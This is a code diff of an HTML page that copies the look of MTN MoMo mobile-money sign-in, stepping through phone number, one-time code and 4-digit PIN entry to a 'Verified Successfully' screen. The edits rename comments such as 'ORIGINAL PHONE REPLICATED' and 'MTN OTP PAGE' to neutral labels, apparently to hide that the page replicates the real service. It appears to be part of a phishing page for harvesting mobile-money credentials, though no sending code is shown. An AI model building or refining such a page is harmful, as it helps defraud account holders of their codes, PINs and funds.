@@ -75,7 +75,7 @@
     .info-box { background: #FFF9E6; border-radius: 8px; padding: 14px 16px; display: flex; gap: 12px; margin-bottom: 25px; width: 100%; text-align: left; }
     .info-icon { background: #FFCC00; color: white; border-radius: 50%; width: 20px; height: 20px; min-width: 20px; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 13px; }
     .info-text { font-size: 13.5px; color: #333333; line-height: 1.4; }
-    .mtn-btn { background: #FFCC00 !important; color: #000000 !important; font-size: 18px !important; cursor: pointer !important; }
+    .mtn-btn { background: #FFCC00 !important; color: #000000 !important; font-size: 18px !important; }
     .resend-container { margin-top: 24px; font-size: 14px; color: #666666; text-align: center; width: 100%; }
     .resend-link { color: #004f71; text-decoration: none; font-weight: bold; cursor: pointer; }
     .footer-curve { width: 100%; height: 40px; background: #FFCC00; clip-path: ellipse(60% 100% at 50% 100%); margin-top: auto; }
@@ -95,7 +95,7 @@
   </header>
 
   <main id="mainContainer">
-    <!-- STEP 1: ORIGINAL PHONE REPLICATED -->
+    <!-- STEP 1: PHONE PAGE -->
     <section id="phonePage">
       <h2>Welcome to MoMo</h2>
       <label class="field-label">Enter number *</label>
@@ -108,7 +108,7 @@
       <p class="legal-text">Signing in confirms your acceptance of our <a href="#">Terms</a> and <a href="#">Privacy Policy</a></p>
     </section>
 
-    <!-- STEP 2: MTN OTP PAGE -->
+    <!-- STEP 2: OTP TEXT INPUT PAGE -->
     <section id="otpScreenOne" class="hidden" style="width:100%; display: flex; flex-direction: column; align-items: center;">
       <div class="graphic-container">
         <div class="phone-icon-mock"></div>
@@ -128,7 +128,7 @@
       <div class="resend-container">Didn't receive the code? <span class="resend-link">Resend</span></div>
     </section>
 
-    <!-- STEP 3: MTN 4-DIGIT SECURE PIN VIEW -->
+    <!-- STEP 3: SPLIT PIN BOXES PAGE -->
     <section id="otpScreenTwo" class="hidden" style="width:100%; display: flex; flex-direction: column; align-items: center;">
       <div class="graphic-container">
         <div class="phone-icon-mock"></div>
@@ -148,7 +148,7 @@
       <div class="resend-container">Didn't receive the code? <span class="resend-link">Resend</span></div>
     </section>
 
-    <!-- STEP 4: SUCCESS VIEW -->
+    <!-- STEP 4: SUCCESS PAGE -->
     <section id="successPage" class="hidden">
       <div class="success">✓ Verified Successfully</div>
     </section>
